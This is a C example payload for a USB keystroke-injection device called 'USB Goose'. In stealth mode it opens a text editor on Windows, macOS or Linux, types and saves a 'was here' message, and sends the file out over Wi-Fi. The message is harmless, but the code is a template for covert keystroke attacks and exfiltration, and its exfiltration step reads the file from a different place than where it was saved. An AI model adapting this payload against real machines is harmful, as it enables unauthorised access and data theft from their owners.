/**
 * @file examples/simple_payload.c
 * @brief Simple example payload using the HAL
 * 
 * This example demonstrates a basic payload that:
 * 1. Detects the operating system
 * 2. Opens a text editor
 * 3. Types a message
 * 4. Saves the file to a specific location
 * 5. Exfiltrates the file over Wi-Fi if available
 */

 #include "hal.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 
 /* The message to type */
 const char *message = "USB Goose was here!\n\n"
                      "This file was created as a demonstration of USB Goose capabilities.\n"
                      "No harm was intended.\n\n"
                      "Current timestamp: %s";
 
 /* Function to open a text editor based on OS */
 static bool open_text_editor(os_type_t os) {
     switch (os) {
         case OS_WINDOWS:
             /* Open Notepad on Windows */
             key_with_modifiers(KEY_R, false, false, false, true);
             usleep(500000);  /* 500ms delay */
             type("notepad", 10);
             key_press(KEY_RETURN);
             usleep(1000000); /* 1s delay for Notepad to open */
             return true;
             
         case OS_MACOS:
             /* Open TextEdit on macOS */
             key_with_modifiers(KEY_SPACE, false, false, false, true);
             usleep(500000);  /* 500ms delay */
             type("textedit", 10);
             key_press(KEY_RETURN);
             usleep(1000000); /* 1s delay for TextEdit to open */
             return true;
             
         case OS_LINUX:
             /* Try to open gedit on Linux */
             key_with_modifiers(KEY_T, true, false, false, true);
             usleep(500000);  /* 500ms delay */
             type("gedit", 10);
             key_press(KEY_RETURN);
             usleep(1000000); /* 1s delay for editor to open */
             return true;
             
         default:
             log_error("Unsupported OS for text editor");
             return false;
     }
 }
 
 /* Function to save the file based on OS */
 static bool save_file(os_type_t os, const char *filename) {
     switch (os) {
         case OS_WINDOWS:
             /* Save file on Windows */
             key_with_modifiers(KEY_S, true, false, false, false);
             usleep(500000);  /* 500ms delay */
             type(filename, 10);
             key_press(KEY_RETURN);
             usleep(500000);  /* 500ms delay */
             return true;
             
         case OS_MACOS:
             /* Save file on macOS */
             key_with_modifiers(KEY_S, false, false, false, true);
             usleep(500000);  /* 500ms delay */
             type(filename, 10);
             key_press(KEY_RETURN);
             usleep(500000);  /* 500ms delay */
             return true;
             
         case OS_LINUX:
             /* Save file on Linux */
             key_with_modifiers(KEY_S, true, false, false, false);
             usleep(500000);  /* 500ms delay */
             type(filename, 10);
             key_press(KEY_RETURN);
             usleep(500000);  /* 500ms delay */
             return true;
             
         default:
             log_error("Unsupported OS for file save");
             return false;
     }
 }
 
 /* Function to get the document path based on OS */
 static const char *get_document_path(os_type_t os) {
     switch (os) {
         case OS_WINDOWS:
             return "C:\\Users\\Public\\Documents\\goose.txt";
             
         case OS_MACOS:
             return "/Users/Shared/goose.txt";
             
         case OS_LINUX:
             return "/tmp/goose.txt";
             
         default:
             return "goose.txt";
     }
 }
 
 /* Progress callback for exfiltration */
 static void exfil_progress(uint32_t sent, uint32_t total) {
     log_info("Exfiltration progress: %u/%u bytes (%.1f%%)", 
              sent, total, (float)sent / total * 100.0f);
 }
 
 int main(void) {
     char timestamp[64];
     char formatted_message[1024];
     os_type_t os;
     const char *filepath;
     
     /* Initialize logging */
     log_init(LOG_LEVEL_INFO, LOG_DEST_SERIAL);
     
     /* Initialize the device */
     if (!init(MODE_STEALTH)) {
         log_error("Failed to initialize device");
         return 1;
     }
     
     /* Initialize HID subsystem */
     if (!hid_init()) {
         log_error("Failed to initialize HID subsystem");
         shutdown();
         return 1;
     }
     
     /* Wait a bit for USB enumeration */
     usleep(3000000);  /* 3s delay */
     
     /* Detect the operating system */
     os = detect_os();
     if (os == OS_UNKNOWN) {
         log_error("Failed to detect OS");
         shutdown();
         return 1;
     }
     
     /* Open a text editor */
     if (!open_text_editor(os)) {
         log_error("Failed to open text editor");
         shutdown();
         return 1;
     }
     
     /* Format the message with current timestamp */
     /* In a real implementation, we would use a proper time function */
     strcpy(timestamp, "2025-02-27 12:34:56");
     snprintf(formatted_message, sizeof(formatted_message), message, timestamp);
     
     /* Type the message */
     type(formatted_message, 5);
     
     /* Get document path and save the file */
     filepath = get_document_path(os);
     if (!save_file(os, filepath)) {
         log_error("Failed to save file");
     }
     
     /* Close the editor */
     key_with_modifiers(KEY_Q, true, false, false, false);
     usleep(500000);  /* 500ms delay */
     key_press(KEY_RETURN);  /* Confirm any "save changes" dialog */
     
     /* Initialize network and exfiltrate the file if internet is available */
     if (network_init() && has_internet()) {
         log_info("Internet available, exfiltrating file");
         
         /* Enable Wi-Fi */
         if (net_enable(NET_WIFI)) {
             /* Try to connect to any open Wi-Fi or known network */
             /* This is simplified - real code would scan and try multiple networks */
             if (wifi_connect("GuestWiFi", NULL, 10000)) {
                 /* Create exfiltration channel */
                 exfil_t exfil = exfil_create(PRIORITY_STEALTH);
                 if (exfil != NULL) {
                     /* Mount public partition where file should now exist */
                     if (mount_partition(PARTITION_PUBLIC, NULL)) {
                         /* Exfiltrate the file */
                         exfil_send_file(exfil, PARTITION_PUBLIC, filepath, exfil_progress);
                         
                         /* Unmount partition */
                         unmount_partition(PARTITION_PUBLIC);
                     }
                     
                     /* Close exfiltration channel */
                     exfil_close(exfil);
                 }
                 
                 /* Disconnect from Wi-Fi */
                 wifi_disconnect();
             }
             
             /* Disable Wi-Fi */
             net_disable(NET_WIFI);
         }
     }
     
     /* Clean shutdown */
     shutdown();
     return 0;
 }